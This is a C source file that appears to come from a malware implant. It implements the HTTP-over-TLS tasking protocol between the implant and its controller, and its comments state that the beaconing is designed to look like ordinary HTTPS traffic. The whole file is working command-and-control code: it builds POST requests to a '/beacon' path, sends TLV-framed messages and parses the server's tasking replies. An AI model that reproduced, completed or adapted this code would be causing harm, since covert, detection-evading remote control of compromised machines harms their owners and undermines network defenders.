#include "protocol.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * protocol.c - HTTP-over-TLS framing for the implant tasking protocol.
 *
 * Each outbound TLV message is wrapped in an HTTP/1.1 POST request with the
 * TLV bytes as the body.  The server responds with an HTTP/1.1 200 whose body
 * contains the reply TLV.  This makes implant beacons indistinguishable from
 * ordinary HTTPS application traffic at the network layer.
 *
 * Header parsing is intentionally minimal: only the status line and
 * Content-Length are examined.  Anything beyond that is silently skipped.
 */

 /* URL path posted to by the implant on every beacon. */
#define BEACON_PATH "/beacon"

/* ---------------------------------------------------------------------------
 * Internal helpers
 * ------------------------------------------------------------------------- */

 /**
  * @brief Reads exactly one byte from the TLS channel into *b.
  */
static BOOL RecvByte(TLS_CONTEXT* ctx, BYTE* b)
{
    return TlsRecvAll(ctx, b, 1);
}

/**
 * @brief Reads and discards HTTP response headers, extracting Content-Length.
 *
 * Reads lines one byte at a time until the blank line that terminates the
 * HTTP header section.  Sets *contentLength from the Content-Length field.
 *
 * @return TRUE if a valid Content-Length was found, FALSE otherwise.
 */
static BOOL ReadHttpResponseHeaders(TLS_CONTEXT* ctx, DWORD* contentLength)
{
    CHAR  lineBuf[1024];
    DWORD lineLen;
    BYTE  b;

    *contentLength = 0;

    for (;;)
    {
        /* Read one CRLF-terminated line. */
        lineLen = 0;
        for (;;)
        {
            if (!RecvByte(ctx, &b)) return FALSE;
            if (lineLen < sizeof(lineBuf) - 1) lineBuf[lineLen++] = (CHAR)b;
            if (b == '\n') break;
        }
        lineBuf[lineLen] = '\0';

        /* Blank line (just \r\n or \n) signals end-of-headers. */
        if (lineLen <= 2) break;

        /* Case-insensitive Content-Length extraction. */
        if (_strnicmp(lineBuf, "Content-Length:", 15) == 0)
        {
            *contentLength = (DWORD)strtoul(lineBuf + 15, NULL, 10);
        }
    }

    return (*contentLength > 0);
}

/* ---------------------------------------------------------------------------
 * HttpSendTlvRoundTrip
 * ------------------------------------------------------------------------- */

BOOL HttpSendTlvRoundTrip(
    TLS_CONTEXT* ctx,
    PCWSTR        host,
    DWORD         msgType,
    DWORD         payloadLen,
    CONST PBYTE   payload,
    TLV_MESSAGE* response)
{
    CHAR  hostA[256] = { 0 };
    CHAR  httpHdr[512];
    INT   hdrLen;
    BYTE  tlvHdr[TLV_HEADER_SIZE];
    DWORD tlvBodyLen;
    DWORD contentLength;
    PBYTE bodyBuf;

    ASSERT(ctx != NULL);
    ASSERT(host != NULL);
    ASSERT(response != NULL);

    response->type = 0;
    response->length = 0;
    response->value = NULL;

    /* Convert wide host to narrow for the HTTP Host header. */
    WideCharToMultiByte(
        CP_ACP, 0, host, -1,
        hostA, (INT)(sizeof(hostA) - 1),
        NULL, NULL);

    /* Total TLV size (header + payload) is the HTTP body length. */
    tlvBodyLen = TLV_HEADER_SIZE + payloadLen;

    /* Build HTTP POST headers. */
    hdrLen = _snprintf_s(
        httpHdr, sizeof(httpHdr), _TRUNCATE,
        "POST " BEACON_PATH " HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %lu\r\n"
        "Connection: close\r\n"
        "\r\n",
        hostA, (ULONG)tlvBodyLen);
    if (hdrLen < 0) return FALSE;

    /* ---- Send HTTP headers ---- */
    if (!TlsSendAll(ctx, (CONST BYTE*)httpHdr, (DWORD)hdrLen)) return FALSE;

    /* ---- Send TLV header ---- */
    *(DWORD*)(tlvHdr + 0) = msgType;
    *(DWORD*)(tlvHdr + 4) = payloadLen;
    if (!TlsSendAll(ctx, tlvHdr, TLV_HEADER_SIZE)) return FALSE;

    /* ---- Send TLV payload (may be empty) ---- */
    if (payloadLen > 0 && payload != NULL)
    {
        if (!TlsSendAll(ctx, payload, payloadLen)) return FALSE;
    }

    /* ---- Read HTTP response headers ---- */
    if (!ReadHttpResponseHeaders(ctx, &contentLength)) return FALSE;
    if (contentLength < TLV_HEADER_SIZE || contentLength >= MAX_MESSAGE_SIZE)
        return FALSE;

    /* ---- Read the HTTP response body verbatim ---- */
    bodyBuf = (PBYTE)ImplantHeapAlloc(contentLength);
    if (bodyBuf == NULL) return FALSE;

    if (!TlsRecvAll(ctx, bodyBuf, contentLength))
    {
        ImplantHeapFree(bodyBuf);
        return FALSE;
    }

    /* ---- Parse TLV from the body ---- */
    response->type = *(DWORD*)(bodyBuf + 0);
    response->length = *(DWORD*)(bodyBuf + 4);

    if (response->length + TLV_HEADER_SIZE != contentLength)
    {
        /* Server sent a body whose size disagrees with the TLV length field. */
        ImplantHeapFree(bodyBuf);
        response->type = 0;
        response->length = 0;
        return FALSE;
    }

    if (response->length > 0)
    {
        response->value = (PBYTE)ImplantHeapAlloc(response->length);
        if (response->value == NULL)
        {
            ImplantHeapFree(bodyBuf);
            response->type = 0;
            response->length = 0;
            return FALSE;
        }
        CopyMemory(response->value, bodyBuf + TLV_HEADER_SIZE, response->length);
    }

    ImplantHeapFree(bodyBuf);
    return TRUE;
}

/* ---------------------------------------------------------------------------
 * FreeTlvMessage
 * ------------------------------------------------------------------------- */

VOID FreeTlvMessage(TLV_MESSAGE* msg)
{
    ASSERT(msg != NULL);

    if (msg->value != NULL)
    {
        ImplantHeapFree(msg->value);
        msg->value = NULL;
    }
    msg->type = 0;
    msg->length = 0;
}